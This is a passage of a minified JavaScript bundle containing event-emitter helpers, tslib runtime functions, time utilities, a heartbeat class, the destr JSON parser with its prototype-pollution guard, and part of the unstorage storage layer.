        if (Z !== void 0)
            return Z.length
    }
    return 0
}
EventEmitter.prototype.eventNames = function() {
    return this._eventsCount > 0 ? ReflectOwnKeys(this._events) : []
}
;
function arrayClone(q, U) {
    for (var Z = new Array(U), oe = 0; oe < U; ++oe)
        Z[oe] = q[oe];
    return Z
}
function spliceOne(q, U) {
    for (; U + 1 < q.length; U++)
        q[U] = q[U + 1];
    q.pop()
}
function unwrapListeners(q) {
    for (var U = new Array(q.length), Z = 0; Z < U.length; ++Z)
        U[Z] = q[Z].listener || q[Z];
    return U
}
function once(q, U) {
    return new Promise(function(Z, oe) {
        function et(ws) {
            q.removeListener(U, st),
            oe(ws)
        }
        function st() {
            typeof q.removeListener == "function" && q.removeListener("error", et),
            Z([].slice.call(arguments))
        }
        eventTargetAgnosticAddListener(q, U, st, {
            once: !0
        }),
        U !== "error" && addErrorHandlerIfEventEmitter(q, et, {
            once: !0
        })
    }
    )
}
function addErrorHandlerIfEventEmitter(q, U, Z) {
    typeof q.on == "function" && eventTargetAgnosticAddListener(q, "error", U, Z)
}
function eventTargetAgnosticAddListener(q, U, Z, oe) {
    if (typeof q.on == "function")
        oe.once ? q.once(U, Z) : q.on(U, Z);
    else if (typeof q.addEventListener == "function")
        q.addEventListener(U, function et(st) {
            oe.once && q.removeEventListener(U, et),
            Z(st)
        });
    else
        throw new TypeError('The "emitter" argument must be of type EventEmitter. Received type ' + typeof q)
}
var eventsExports = events.exports;
const gs$1 = getDefaultExportFromCjs(eventsExports);
var cjs$3 = {};
/*! *****************************************************************************
Copyright (c) Microsoft Corporation.

Permission to use, copy, modify, and/or distribute this software for any
purpose with or without fee is hereby granted.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH
REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY
AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT,
INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM
LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR
OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR
PERFORMANCE OF THIS SOFTWARE.
***************************************************************************** */
var extendStatics = function(q, U) {
    return extendStatics = Object.setPrototypeOf || {
        __proto__: []
    }instanceof Array && function(Z, oe) {
        Z.__proto__ = oe
    }
    || function(Z, oe) {
        for (var et in oe)
            oe.hasOwnProperty(et) && (Z[et] = oe[et])
    }
    ,
    extendStatics(q, U)
};
function __extends(q, U) {
    extendStatics(q, U);
    function Z() {
        this.constructor = q
    }
    q.prototype = U === null ? Object.create(U) : (Z.prototype = U.prototype,
    new Z)
}
var __assign = function() {
    return __assign = Object.assign || function(U) {
        for (var Z, oe = 1, et = arguments.length; oe < et; oe++) {
            Z = arguments[oe];
            for (var st in Z)
                Object.prototype.hasOwnProperty.call(Z, st) && (U[st] = Z[st])
        }
        return U
    }
    ,
    __assign.apply(this, arguments)
};
function __rest(q, U) {
    var Z = {};
    for (var oe in q)
        Object.prototype.hasOwnProperty.call(q, oe) && U.indexOf(oe) < 0 && (Z[oe] = q[oe]);
    if (q != null && typeof Object.getOwnPropertySymbols == "function")
        for (var et = 0, oe = Object.getOwnPropertySymbols(q); et < oe.length; et++)
            U.indexOf(oe[et]) < 0 && Object.prototype.propertyIsEnumerable.call(q, oe[et]) && (Z[oe[et]] = q[oe[et]]);
    return Z
}
function __decorate(q, U, Z, oe) {
    var et = arguments.length, st = et < 3 ? U : oe === null ? oe = Object.getOwnPropertyDescriptor(U, Z) : oe, ws;
    if (typeof Reflect == "object" && typeof Reflect.decorate == "function")
        st = Reflect.decorate(q, U, Z, oe);
    else
        for (var ms = q.length - 1; ms >= 0; ms--)
            (ws = q[ms]) && (st = (et < 3 ? ws(st) : et > 3 ? ws(U, Z, st) : ws(U, Z)) || st);
    return et > 3 && st && Object.defineProperty(U, Z, st),
    st
}
function __param(q, U) {
    return function(Z, oe) {
        U(Z, oe, q)
    }
}
function __metadata(q, U) {
    if (typeof Reflect == "object" && typeof Reflect.metadata == "function")
        return Reflect.metadata(q, U)
}
function __awaiter(q, U, Z, oe) {
    function et(st) {
        return st instanceof Z ? st : new Z(function(ws) {
            ws(st)
        }
        )
    }
    return new (Z || (Z = Promise))(function(st, ws) {
        function ms(_s) {
            try {
                vs(oe.next(_s))
            } catch (Is) {
                ws(Is)
            }
        }
        function Es(_s) {
            try {
                vs(oe.throw(_s))
            } catch (Is) {
                ws(Is)
            }
        }
        function vs(_s) {
            _s.done ? st(_s.value) : et(_s.value).then(ms, Es)
        }
        vs((oe = oe.apply(q, U || [])).next())
    }
    )
}
function __generator(q, U) {
    var Z = {
        label: 0,
        sent: function() {
            if (st[0] & 1)
                throw st[1];
            return st[1]
        },
        trys: [],
        ops: []
    }, oe, et, st, ws;
    return ws = {
        next: ms(0),
        throw: ms(1),
        return: ms(2)
    },
    typeof Symbol == "function" && (ws[Symbol.iterator] = function() {
        return this
    }
    ),
    ws;
    function ms(vs) {
        return function(_s) {
            return Es([vs, _s])
        }
    }
    function Es(vs) {
        if (oe)
            throw new TypeError("Generator is already executing.");
        for (; Z; )
            try {
                if (oe = 1,
                et && (st = vs[0] & 2 ? et.return : vs[0] ? et.throw || ((st = et.return) && st.call(et),
                0) : et.next) && !(st = st.call(et, vs[1])).done)
                    return st;
                switch (et = 0,
                st && (vs = [vs[0] & 2, st.value]),
                vs[0]) {
                case 0:
                case 1:
                    st = vs;
                    break;
                case 4:
                    return Z.label++,
                    {
                        value: vs[1],
                        done: !1
                    };
                case 5:
                    Z.label++,
                    et = vs[1],
                    vs = [0];
                    continue;
                case 7:
                    vs = Z.ops.pop(),
                    Z.trys.pop();
                    continue;
                default:
                    if (st = Z.trys,
                    !(st = st.length > 0 && st[st.length - 1]) && (vs[0] === 6 || vs[0] === 2)) {
                        Z = 0;
                        continue
                    }
                    if (vs[0] === 3 && (!st || vs[1] > st[0] && vs[1] < st[3])) {
                        Z.label = vs[1];
                        break
                    }
                    if (vs[0] === 6 && Z.label < st[1]) {
                        Z.label = st[1],
                        st = vs;
                        break
                    }
                    if (st && Z.label < st[2]) {
                        Z.label = st[2],
                        Z.ops.push(vs);
                        break
                    }
                    st[2] && Z.ops.pop(),
                    Z.trys.pop();
                    continue
                }
                vs = U.call(q, Z)
            } catch (_s) {
                vs = [6, _s],
                et = 0
            } finally {
                oe = st = 0
            }
        if (vs[0] & 5)
            throw vs[1];
        return {
            value: vs[0] ? vs[1] : void 0,
            done: !0
        }
    }
}
function __createBinding(q, U, Z, oe) {
    oe === void 0 && (oe = Z),
    q[oe] = U[Z]
}
function __exportStar(q, U) {
    for (var Z in q)
        Z !== "default" && !U.hasOwnProperty(Z) && (U[Z] = q[Z])
}
function __values(q) {
    var U = typeof Symbol == "function" && Symbol.iterator
      , Z = U && q[U]
      , oe = 0;
    if (Z)
        return Z.call(q);
    if (q && typeof q.length == "number")
        return {
            next: function() {
                return q && oe >= q.length && (q = void 0),
                {
                    value: q && q[oe++],
                    done: !q
                }
            }
        };
    throw new TypeError(U ? "Object is not iterable." : "Symbol.iterator is not defined.")
}
function __read(q, U) {
    var Z = typeof Symbol == "function" && q[Symbol.iterator];
    if (!Z)
        return q;
    var oe = Z.call(q), et, st = [], ws;
    try {
        for (; (U === void 0 || U-- > 0) && !(et = oe.next()).done; )
            st.push(et.value)
    } catch (ms) {
        ws = {
            error: ms
        }
    } finally {
        try {
            et && !et.done && (Z = oe.return) && Z.call(oe)
        } finally {
            if (ws)
                throw ws.error
        }
    }
    return st
}
function __spread() {
    for (var q = [], U = 0; U < arguments.length; U++)
        q = q.concat(__read(arguments[U]));
    return q
}
function __spreadArrays() {
    for (var q = 0, U = 0, Z = arguments.length; U < Z; U++)
        q += arguments[U].length;
    for (var oe = Array(q), et = 0, U = 0; U < Z; U++)
        for (var st = arguments[U], ws = 0, ms = st.length; ws < ms; ws++,
        et++)
            oe[et] = st[ws];
    return oe
}
function __await(q) {
    return this instanceof __await ? (this.v = q,
    this) : new __await(q)
}
function __asyncGenerator(q, U, Z) {
    if (!Symbol.asyncIterator)
        throw new TypeError("Symbol.asyncIterator is not defined.");
    var oe = Z.apply(q, U || []), et, st = [];
    return et = {},
    ws("next"),
    ws("throw"),
    ws("return"),
    et[Symbol.asyncIterator] = function() {
        return this
    }
    ,
    et;
    function ws(Ss) {
        oe[Ss] && (et[Ss] = function(Ts) {
            return new Promise(function(Rs, Ns) {
                st.push([Ss, Ts, Rs, Ns]) > 1 || ms(Ss, Ts)
            }
            )
        }
        )
    }
    function ms(Ss, Ts) {
        try {
            Es(oe[Ss](Ts))
        } catch (Rs) {
            Is(st[0][3], Rs)
        }
    }
    function Es(Ss) {
        Ss.value instanceof __await ? Promise.resolve(Ss.value.v).then(vs, _s) : Is(st[0][2], Ss)
    }
    function vs(Ss) {
        ms("next", Ss)
    }
    function _s(Ss) {
        ms("throw", Ss)
    }
    function Is(Ss, Ts) {
        Ss(Ts),
        st.shift(),
        st.length && ms(st[0][0], st[0][1])
    }
}
function __asyncDelegator(q) {
    var U, Z;
    return U = {},
    oe("next"),
    oe("throw", function(et) {
        throw et
    }),
    oe("return"),
    U[Symbol.iterator] = function() {
        return this
    }
    ,
    U;
    function oe(et, st) {
        U[et] = q[et] ? function(ws) {
            return (Z = !Z) ? {
                value: __await(q[et](ws)),
                done: et === "return"
            } : st ? st(ws) : ws
        }
        : st
    }
}
function __asyncValues(q) {
    if (!Symbol.asyncIterator)
        throw new TypeError("Symbol.asyncIterator is not defined.");
    var U = q[Symbol.asyncIterator], Z;
    return U ? U.call(q) : (q = typeof __values == "function" ? __values(q) : q[Symbol.iterator](),
    Z = {},
    oe("next"),
    oe("throw"),
    oe("return"),
    Z[Symbol.asyncIterator] = function() {
        return this
    }
    ,
    Z);
    function oe(st) {
        Z[st] = q[st] && function(ws) {
            return new Promise(function(ms, Es) {
                ws = q[st](ws),
                et(ms, Es, ws.done, ws.value)
            }
            )
        }
    }
    function et(st, ws, ms, Es) {
        Promise.resolve(Es).then(function(vs) {
            st({
                value: vs,
                done: ms
            })
        }, ws)
    }
}
function __makeTemplateObject(q, U) {
    return Object.defineProperty ? Object.defineProperty(q, "raw", {
        value: U
    }) : q.raw = U,
    q
}
function __importStar(q) {
    if (q && q.__esModule)
        return q;
    var U = {};
    if (q != null)
        for (var Z in q)
            Object.hasOwnProperty.call(q, Z) && (U[Z] = q[Z]);
    return U.default = q,
    U
}
function __importDefault(q) {
    return q && q.__esModule ? q : {
        default: q
    }
}
function __classPrivateFieldGet(q, U) {
    if (!U.has(q))
        throw new TypeError("attempted to get private field on non-instance");
    return U.get(q)
}
function __classPrivateFieldSet(q, U, Z) {
    if (!U.has(q))
        throw new TypeError("attempted to set private field on non-instance");
    return U.set(q, Z),
    Z
}
const tslib_es6 = Object.freeze(Object.defineProperty({
    __proto__: null,
    get __assign() {
        return __assign
    },
    __asyncDelegator,
    __asyncGenerator,
    __asyncValues,
    __await,
    __awaiter,
    __classPrivateFieldGet,
    __classPrivateFieldSet,
    __createBinding,
    __decorate,
    __exportStar,
    __extends,
    __generator,
    __importDefault,
    __importStar,
    __makeTemplateObject,
    __metadata,
    __param,
    __read,
    __rest,
    __spread,
    __spreadArrays,
    __values
}, Symbol.toStringTag, {
    value: "Module"
}))
  , require$$0 = getAugmentedNamespace(tslib_es6);
var utils = {}, delay = {}, hasRequiredDelay;
function requireDelay() {
    if (hasRequiredDelay)
        return delay;
    hasRequiredDelay = 1,
    Object.defineProperty(delay, "__esModule", {
        value: !0
    }),
    delay.delay = void 0;
    function q(U) {
        return new Promise(Z => {
            setTimeout( () => {
                Z(!0)
            }
            , U)
        }
        )
    }
    return delay.delay = q,
    delay
}
var convert = {}, constants = {}, misc = {}, hasRequiredMisc;
function requireMisc() {
    return hasRequiredMisc || (hasRequiredMisc = 1,
    Object.defineProperty(misc, "__esModule", {
        value: !0
    }),
    misc.ONE_THOUSAND = misc.ONE_HUNDRED = void 0,
    misc.ONE_HUNDRED = 100,
    misc.ONE_THOUSAND = 1e3),
    misc
}
var time = {}, hasRequiredTime;
function requireTime() {
    return hasRequiredTime || (hasRequiredTime = 1,
    function(q) {
        Object.defineProperty(q, "__esModule", {
            value: !0
        }),
        q.ONE_YEAR = q.FOUR_WEEKS = q.THREE_WEEKS = q.TWO_WEEKS = q.ONE_WEEK = q.THIRTY_DAYS = q.SEVEN_DAYS = q.FIVE_DAYS = q.THREE_DAYS = q.ONE_DAY = q.TWENTY_FOUR_HOURS = q.TWELVE_HOURS = q.SIX_HOURS = q.THREE_HOURS = q.ONE_HOUR = q.SIXTY_MINUTES = q.THIRTY_MINUTES = q.TEN_MINUTES = q.FIVE_MINUTES = q.ONE_MINUTE = q.SIXTY_SECONDS = q.THIRTY_SECONDS = q.TEN_SECONDS = q.FIVE_SECONDS = q.ONE_SECOND = void 0,
        q.ONE_SECOND = 1,
        q.FIVE_SECONDS = 5,
        q.TEN_SECONDS = 10,
        q.THIRTY_SECONDS = 30,
        q.SIXTY_SECONDS = 60,
        q.ONE_MINUTE = q.SIXTY_SECONDS,
        q.FIVE_MINUTES = q.ONE_MINUTE * 5,
        q.TEN_MINUTES = q.ONE_MINUTE * 10,
        q.THIRTY_MINUTES = q.ONE_MINUTE * 30,
        q.SIXTY_MINUTES = q.ONE_MINUTE * 60,
        q.ONE_HOUR = q.SIXTY_MINUTES,
        q.THREE_HOURS = q.ONE_HOUR * 3,
        q.SIX_HOURS = q.ONE_HOUR * 6,
        q.TWELVE_HOURS = q.ONE_HOUR * 12,
        q.TWENTY_FOUR_HOURS = q.ONE_HOUR * 24,
        q.ONE_DAY = q.TWENTY_FOUR_HOURS,
        q.THREE_DAYS = q.ONE_DAY * 3,
        q.FIVE_DAYS = q.ONE_DAY * 5,
        q.SEVEN_DAYS = q.ONE_DAY * 7,
        q.THIRTY_DAYS = q.ONE_DAY * 30,
        q.ONE_WEEK = q.SEVEN_DAYS,
        q.TWO_WEEKS = q.ONE_WEEK * 2,
        q.THREE_WEEKS = q.ONE_WEEK * 3,
        q.FOUR_WEEKS = q.ONE_WEEK * 4,
        q.ONE_YEAR = q.ONE_DAY * 365
    }(time)),
    time
}
var hasRequiredConstants;
function requireConstants() {
    return hasRequiredConstants || (hasRequiredConstants = 1,
    function(q) {
        Object.defineProperty(q, "__esModule", {
            value: !0
        });
        const U = require$$0;
        U.__exportStar(requireMisc(), q),
        U.__exportStar(requireTime(), q)
    }(constants)),
    constants
}
var hasRequiredConvert;
function requireConvert() {
    if (hasRequiredConvert)
        return convert;
    hasRequiredConvert = 1,
    Object.defineProperty(convert, "__esModule", {
        value: !0
    }),
    convert.fromMiliseconds = convert.toMiliseconds = void 0;
    const q = requireConstants();
    function U(oe) {
        return oe * q.ONE_THOUSAND
    }
    convert.toMiliseconds = U;
    function Z(oe) {
        return Math.floor(oe / q.ONE_THOUSAND)
    }
    return convert.fromMiliseconds = Z,
    convert
}
var hasRequiredUtils;
function requireUtils() {
    return hasRequiredUtils || (hasRequiredUtils = 1,
    function(q) {
        Object.defineProperty(q, "__esModule", {
            value: !0
        });
        const U = require$$0;
        U.__exportStar(requireDelay(), q),
        U.__exportStar(requireConvert(), q)
    }(utils)),
    utils
}
var watch$2 = {}, hasRequiredWatch$1;
function requireWatch$1() {
    if (hasRequiredWatch$1)
        return watch$2;
    hasRequiredWatch$1 = 1,
    Object.defineProperty(watch$2, "__esModule", {
        value: !0
    }),
    watch$2.Watch = void 0;
    class q {
        constructor() {
            this.timestamps = new Map
        }
        start(Z) {
            if (this.timestamps.has(Z))
                throw new Error(`Watch already started for label: ${Z}`);
            this.timestamps.set(Z, {
                started: Date.now()
            })
        }
        stop(Z) {
            const oe = this.get(Z);
            if (typeof oe.elapsed < "u")
                throw new Error(`Watch already stopped for label: ${Z}`);
            const et = Date.now() - oe.started;
            this.timestamps.set(Z, {
                started: oe.started,
                elapsed: et
            })
        }
        get(Z) {
            const oe = this.timestamps.get(Z);
            if (typeof oe > "u")
                throw new Error(`No timestamp found for label: ${Z}`);
            return oe
        }
        elapsed(Z) {
            const oe = this.get(Z);
            return oe.elapsed || Date.now() - oe.started
        }
    }
    return watch$2.Watch = q,
    watch$2.default = q,
    watch$2
}
var types = {}, watch$1 = {}, hasRequiredWatch;
function requireWatch() {
    if (hasRequiredWatch)
        return watch$1;
    hasRequiredWatch = 1,
    Object.defineProperty(watch$1, "__esModule", {
        value: !0
    }),
    watch$1.IWatch = void 0;
    class q {
    }
    return watch$1.IWatch = q,
    watch$1
}
var hasRequiredTypes;
function requireTypes() {
    return hasRequiredTypes || (hasRequiredTypes = 1,
    function(q) {
        Object.defineProperty(q, "__esModule", {
            value: !0
        }),
        require$$0.__exportStar(requireWatch(), q)
    }(types)),
    types
}
(function(q) {
    Object.defineProperty(q, "__esModule", {
        value: !0
    });
    const U = require$$0;
    U.__exportStar(requireUtils(), q),
    U.__exportStar(requireWatch$1(), q),
    U.__exportStar(requireTypes(), q),
    U.__exportStar(requireConstants(), q)
}
)(cjs$3);
class IEvents {
}
let n$2 = class extends IEvents {
    constructor(U) {
        super()
    }
}
;
const s = cjs$3.FIVE_SECONDS
  , r$1 = {
    pulse: "heartbeat_pulse"
};
let i$2 = class Al extends n$2 {
    constructor(U) {
        super(U),
        this.events = new eventsExports.EventEmitter,
        this.interval = s,
        this.interval = (U == null ? void 0 : U.interval) || s
    }
    static async init(U) {
        const Z = new Al(U);
        return await Z.init(),
        Z
    }
    async init() {
        await this.initialize()
    }
    stop() {
        clearInterval(this.intervalRef)
    }
    on(U, Z) {
        this.events.on(U, Z)
    }
    once(U, Z) {
        this.events.once(U, Z)
    }
    off(U, Z) {
        this.events.off(U, Z)
    }
    removeListener(U, Z) {
        this.events.removeListener(U, Z)
    }
    async initialize() {
        this.intervalRef = setInterval( () => this.pulse(), cjs$3.toMiliseconds(this.interval))
    }
    pulse() {
        this.events.emit(r$1.pulse)
    }
}
;
const suspectProtoRx = /"(?:_|\\u0{2}5[Ff]){2}(?:p|\\u0{2}70)(?:r|\\u0{2}72)(?:o|\\u0{2}6[Ff])(?:t|\\u0{2}74)(?:o|\\u0{2}6[Ff])(?:_|\\u0{2}5[Ff]){2}"\s*:/
  , suspectConstructorRx = /"(?:c|\\u0063)(?:o|\\u006[Ff])(?:n|\\u006[Ee])(?:s|\\u0073)(?:t|\\u0074)(?:r|\\u0072)(?:u|\\u0075)(?:c|\\u0063)(?:t|\\u0074)(?:o|\\u006[Ff])(?:r|\\u0072)"\s*:/
  , JsonSigRx = /^\s*["[{]|^\s*-?\d{1,16}(\.\d{1,17})?([Ee][+-]?\d+)?\s*$/;
function jsonParseTransform(q, U) {
    if (q === "__proto__" || q === "constructor" && U && typeof U == "object" && "prototype"in U) {
        warnKeyDropped(q);
        return
    }
    return U
}
function warnKeyDropped(q) {
    console.warn(`[destr] Dropping "${q}" key to prevent prototype pollution.`)
}
function destr(q, U={}) {
    if (typeof q != "string")
        return q;
    if (q[0] === '"' && q[q.length - 1] === '"' && q.indexOf("\\") === -1)
        return q.slice(1, -1);
    const Z = q.trim();
    if (Z.length <= 9)
        switch (Z.toLowerCase()) {
        case "true":
            return !0;
        case "false":
            return !1;
        case "undefined":
            return;
        case "null":
            return null;
        case "nan":
            return Number.NaN;
        case "infinity":
            return Number.POSITIVE_INFINITY;
        case "-infinity":
            return Number.NEGATIVE_INFINITY
        }
    if (!JsonSigRx.test(q)) {
        if (U.strict)
            throw new SyntaxError("[destr] Invalid JSON");
        return q
    }
    try {
        if (suspectProtoRx.test(q) || suspectConstructorRx.test(q)) {
            if (U.strict)
                throw new Error("[destr] Possible prototype pollution");
            return JSON.parse(q, jsonParseTransform)
        }
        return JSON.parse(q)
    } catch (oe) {
        if (U.strict)
            throw oe;
        return q
    }
}
function wrapToPromise(q) {
    return !q || typeof q.then != "function" ? Promise.resolve(q) : q
}
function asyncCall(q, ...U) {
    try {
        return wrapToPromise(q(...U))
    } catch (Z) {
        return Promise.reject(Z)
    }
}
function isPrimitive(q) {
    const U = typeof q;
    return q === null || U !== "object" && U !== "function"
}
function isPureObject(q) {
    const U = Object.getPrototypeOf(q);
    return !U || U.isPrototypeOf(Object)
}
function stringify(q) {
    if (isPrimitive(q))
        return String(q);
    if (isPureObject(q) || Array.isArray(q))
        return JSON.stringify(q);
    if (typeof q.toJSON == "function")
        return stringify(q.toJSON());
    throw new Error("[unstorage] Cannot stringify value!")
}
const BASE64_PREFIX = "base64:";
function serializeRaw(q) {
    return typeof q == "string" ? q : BASE64_PREFIX + base64Encode(q)
}
function deserializeRaw(q) {
    return typeof q != "string" || !q.startsWith(BASE64_PREFIX) ? q : base64Decode(q.slice(BASE64_PREFIX.length))
}
function base64Decode(q) {
    return globalThis.Buffer ? Buffer.from(q, "base64") : Uint8Array.from(globalThis.atob(q), U => U.codePointAt(0))
}
function base64Encode(q) {
    return globalThis.Buffer ? Buffer.from(q).toString("base64") : globalThis.btoa(String.fromCodePoint(...q))
}
function normalizeKey(q) {
    var U;
    return q && ((U = q.split("?")[0]) == null ? void 0 : U.replace(/[/\\]/g, ":").replace(/:+/g, ":").replace(/^:|:$/g, "")) || ""
}
function joinKeys(...q) {
    return normalizeKey(q.join(":"))
}
function normalizeBaseKey(q) {
    return q = normalizeKey(q),
    q ? q + ":" : ""
}
function filterKeyByDepth(q, U) {
    if (U === void 0)
        return !0;
    let Z = 0
      , oe = q.indexOf(":");
    for (; oe > -1; )
        Z++,
        oe = q.indexOf(":", oe + 1);
    return Z <= U
}
function filterKeyByBase(q, U) {
    return U ? q.startsWith(U) && q[q.length - 1] !== "$" : q[q.length - 1] !== "$"
}
function defineDriver(q) {
    return q
}
const DRIVER_NAME = "memory"
  , memory = () => {
    const q = new Map;
    return {
        name: DRIVER_NAME,
        getInstance: () => q,
        hasItem(U) {
            return q.has(U)
        },
        getItem(U) {
            return q.get(U) ?? null
        },
        getItemRaw(U) {
            return q.get(U) ?? null
        },
        setItem(U, Z) {
            q.set(U, Z)
        },
        setItemRaw(U, Z) {
            q.set(U, Z)
        },
        removeItem(U) {
            q.delete(U)
        },
        getKeys() {
            return [...q.keys()]
        },
        clear() {
            q.clear()
        },
        dispose() {
            q.clear()
        }
    }
}
;
function createStorage(q={}) {
    const U = {
        mounts: {
            "": q.driver || memory()
        },
        mountpoints: [""],
        watching: !1,
        watchListeners: [],
        unwatch: {}
    }
      , Z = vs => {
        for (const _s of U.mountpoints)
            if (vs.startsWith(_s))
                return {
                    base: _s,
                    relativeKey: vs.slice(_s.length),
                    driver: U.mounts[_s]
                };
        return {
            base: "",
            relativeKey: vs,
            driver: U.mounts[""]
        }
    }
      , oe = (vs, _s) => U.mountpoints.filter(Is => Is.startsWith(vs) || _s && vs.startsWith(Is)).map(Is => ({
        relativeBase: vs.length > Is.length ? vs.slice(Is.length) : void 0,
        mountpoint: Is,
        driver: U.mounts[Is]
    }))
      , et = (vs, _s) => {
        if (U.watching) {
            _s = normalizeKey(_s);
            for (const Is of U.watchListeners)
                Is(vs, _s)
        }
    }
      , st = async () => {
        if (!U.watching) {
            U.watching = !0;
            for (const vs in U.mounts)
                U.unwatch[vs] = await watch(U.mounts[vs], et, vs)
        }
    }
      , ws = async () => {
        if (U.watching) {
            for (const vs in U.unwatch)
                await U.unwatch[vs]();
            U.unwatch = {},
            U.watching = !1
        }
    }
      , ms = (vs, _s, Is) => {
        const Ss = new Map
          , Ts = Rs => {
            let Ns = Ss.get(Rs.base);
            return Ns || (Ns = {
                driver: Rs.driver,
                base: Rs.base,
                items: []
            },
            Ss.set(Rs.base, Ns)),
            Ns
        }
        ;
        for (const Rs of vs) {
            const Ns = typeof Rs == "string"
              , Hs = normalizeKey(Ns ? Rs : Rs.key)
              , ha = Ns ? void 0 : Rs.value
              , pa = Ns || !Rs.options ? _s : {
                ..._s,
                ...Rs.options
            }
              , Zs = Z(Hs);
            Ts(Zs).items.push({
                key: Hs,
                value: ha,
                relativeKey: Zs.relativeKey,
                options: pa
            })
        }
        return Promise.all([...Ss.values()].map(Rs => Is(Rs))).then(Rs => Rs.flat())
    }
      , Es = {
        hasItem(vs, _s={}) {
            vs = normalizeKey(vs);
            const {relativeKey: Is, driver: Ss} = Z(vs);
            return asyncCall(Ss.hasItem, Is, _s)
        },
        getItem(vs, _s={}) {
            vs = normalizeKey(vs);
            const {relativeKey: Is, driver: Ss} = Z(vs);
            return asyncCall(Ss.getItem, Is, _s).then(Ts => destr(Ts))
        },
        getItems(vs, _s={}) {
            return ms(vs, _s, Is => Is.driver.getItems ? asyncCall(Is.driver.getItems, Is.items.map(Ss => ({
                key: Ss.relativeKey,
                options: Ss.options
            })), _s).then(Ss => Ss.map(Ts => ({
                key: joinKeys(Is.base, Ts.key),
                value: destr(Ts.value)
            }))) : Promise.all(Is.items.map(Ss => asyncCall(Is.driver.getItem, Ss.relativeKey, Ss.options).then(Ts => ({
                key: Ss.key,
                value: destr(Ts)
            })))))
        },
        getItemRaw(vs, _s={}) {
            vs = normalizeKey(vs);
            const {relativeKey: Is, driver: Ss} = Z(vs);
            return Ss.getItemRaw ? asyncCall(Ss.getItemRaw, Is, _s) : asyncCall(Ss.getItem, Is, _s).then(Ts => deserializeRaw(Ts))
        },
        async setItem(vs, _s, Is={}) {
            if (_s === void 0)
                return Es.removeItem(vs);
            vs = normalizeKey(vs);
            const {relativeKey: Ss, driver: Ts} = Z(vs);
            Ts.setItem && (await asyncCall(Ts.setItem, Ss, stringify(_s), Is),
            Ts.watch || et("update", vs))
        },
        async setItems(vs, _s) {
            await ms(vs, _s, async Is => {
                if (Is.driver.setItems)
                    return asyncCall(Is.driver.setItems, Is.items.map(Ss => ({
                        key: Ss.relativeKey,
                        value: stringify(Ss.value),
                        options: Ss.options
                    })), _s);
                Is.driver.setItem && await Promise.all(Is.items.map(Ss => asyncCall(Is.driver.setItem, Ss.relativeKey, stringify(Ss.value), Ss.options)))
            }
            )
        },
        async setItemRaw(vs, _s, Is={}) {
            if (_s === void 0)
                return Es.removeItem(vs, Is);
            vs = normalizeKey(vs);
            const {relativeKey: Ss, driver: Ts} = Z(vs);
            if (Ts.setItemRaw)
                await asyncCall(Ts.setItemRaw, Ss, _s, Is);
            else if (Ts.setItem)
                await asyncCall(Ts.setItem, Ss, serializeRaw(_s), Is);
            else
                return;
            Ts.watch || et("update", vs)
        },
        async removeItem(vs, _s={}) {
            typeof _s == "boolean" && (_s = {
                removeMeta: _s
            }),
            vs = normalizeKey(vs);
            const {relativeKey: Is, driver: Ss} = Z(vs);
            Ss.removeItem && (await asyncCall(Ss.removeItem, Is, _s),
            (_s.removeMeta || _s.removeMata) && await asyncCall(Ss.removeItem, Is + "$", _s),
            Ss.watch || et("remove", vs))
        },
        async getMeta(vs, _s={}) {
            typeof _s == "boolean" && (_s = {
                nativeOnly: _s
            }),
            vs = normalizeKey(vs);
            const {relativeKey: Is, driver: Ss} = Z(vs)
              , Ts = Object.create(null);
            if (Ss.getMeta && Object.assign(Ts, await asyncCall(Ss.getMeta, Is, _s)),
            !_s.nativeOnly) {
                const Rs = await asyncCall(Ss.getItem, Is + "$", _s).then(Ns => destr(Ns));
                Rs && typeof Rs == "object" && (typeof Rs.atime == "string" && (Rs.atime = new Date(Rs.atime)),
                typeof Rs.mtime == "string" && (Rs.mtime = new Date(Rs.mtime)),
                Object.assign(Ts, Rs))
            }
            return Ts
        },
        setMeta(vs, _s, Is={}) {
            return this.setItem(vs + "$", _s, Is)
        },
        removeMeta(vs, _s={}) {
            return this.removeItem(vs + "$", _s)
        },
        async getKeys(vs, _s={}) {
            var Hs;
            vs = normalizeBaseKey(vs);
            const Is = oe(vs, !0);
            let Ss = [];
            const Ts = [];
            let Rs = !0;
            for (const ha of Is) {
                (Hs = ha.driver.flags) != null && Hs.maxDepth || (Rs = !1);
                const pa = await asyncCall(ha.driver.getKeys, ha.relativeBase, _s);
                for (const Zs of pa) {
                    const Qa = ha.mountpoint + normalizeKey(Zs);
                    Ss.some(Ga => Qa.startsWith(Ga)) || Ts.push(Qa)
                }
                Ss = [ha.mountpoint, ...Ss.filter(Zs => !Zs.startsWith(ha.mountpoint))]
            }
            const Ns = _s.maxDepth !== void 0 && !Rs;
            return Ts.filter(ha => (!Ns || filterKeyByDepth(ha, _s.maxDepth)) && filterKeyByBase(ha, vs))
        },
        async clear(vs, _s={}) {
            vs = normalizeBaseKey(vs),
            await Promise.all(oe(vs, !1).map(async Is => {
                if (Is.driver.clear)
                    return asyncCall(Is.driver.clear, Is.relativeBase, _s);
                if (Is.driver.removeItem) {
                    const Ss = await Is.driver.getKeys(Is.relativeBase || "", _s);
                    return Promise.all(Ss.map(Ts => Is.driver.removeItem(Ts, _s)))
                }
            }
            ))
        },
        async dispose() {
            await Promise.all(Object.values(U.mounts).map(vs => dispose(vs)))
        },
        async watch(vs) {
            return await st(),
            U.watchListeners.push(vs),
            async () => {
                U.watchListeners = U.watchListeners.filter(_s => _s !== vs),
                U.watchListeners.length === 0 && await ws()
            }
        },
        async unwatch() {
            U.watchListeners = [],
            await ws()
        },
        mount(vs, _s) {
            if (vs = normalizeBaseKey(vs),
            vs && U.mounts[vs])
                throw new Error(`already mounted at ${vs}`);
            return vs && (U.mountpoints.push(vs),
            U.mountpoints.sort( (Is, Ss) => Ss.length - Is.length)),
            U.mounts[vs] = _s,
            U.watching && Promise.resolve(watch(_s, et, vs)).then(Is => {
                U.unwatch[vs] = Is
            }
            ).catch(console.error),
            Es
        },
        async unmount(vs, _s=!0) {
            var Is, Ss;
